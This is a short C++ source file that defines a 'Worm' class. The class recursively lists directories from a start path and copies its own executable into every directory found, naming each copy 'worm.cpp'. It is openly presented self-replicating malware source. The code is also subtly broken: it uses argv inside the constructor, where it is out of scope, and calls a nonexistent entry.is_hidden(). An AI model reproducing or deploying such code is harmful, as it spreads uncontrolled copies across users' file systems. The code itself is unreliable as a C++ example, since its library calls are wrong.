// Recursively lists directories, avoiding hidden files, and then creates a new worm file in each of the target directories. 
// Note that this C++ code utilizes the <filesystem> library, which is available in C++17 and later.

#include <iostream>
#include <filesystem>
#include <vector>
#include <string>
#include <fstream>
#include <cstdlib>

namespace fs = std::filesystem;

class Worm {
private:
    std::string path;               // Path to start the worm from
    std::vector<std::string> targetDirList;  // List of target directories to replicate into
    int iteration;                  // Number of iterations for file copying
    std::string ownPath;            // Absolute path of the worm's own executable

public:
    // Constructor
    Worm(const std::string& path = "/", const std::vector<std::string>& targetDirList = {}, int iteration = 2)
        : path(path), targetDirList(targetDirList), iteration(iteration) {
        ownPath = fs::canonical(fs::path(argv[0])).string();  // Get the absolute path of the executable
    }

    // Recursive function to list directories and files
    void listDirectories(const std::string& path) {
        targetDirList.push_back(path);  // Add the current directory to the target list
        for (const auto& entry : fs::directory_iterator(path)) {
            if (!entry.is_hidden()) {   // Avoid hidden files/directories
                std::cout << entry.path() << std::endl;  // Print the absolute path (for demonstration)
                if (entry.is_directory()) {
                    listDirectories(entry.path().string());  // Recursively list directories
                }
            }
        }
    }

    // Function to create new worm copies in target directories
    void createNewWorm() {
        for (const auto& directory : targetDirList) {
            std::string destination = directory + "/worm.cpp";  // New worm file name
            std::ifstream sourceFile(ownPath, std::ios::binary);  // Open the source worm file
            std::ofstream destFile(destination, std::ios::binary);  // Create the new worm file
            destFile << sourceFile.rdbuf();  // Copy the content of the source worm file to the new file
        }
    }

    // Function to start the worm actions
    void startWormActions() {
        listDirectories(path);  // List directories recursively starting from the specified path
        createNewWorm();  // Create new worm copies in target directories
    }
};

int main(int argc, char* argv[]) {
    std::string currentDirectory = ".";  // Default starting directory
    Worm worm(currentDirectory);  // Create a Worm object
    worm.startWormActions();  // Start the worm actions
    return 0;
}
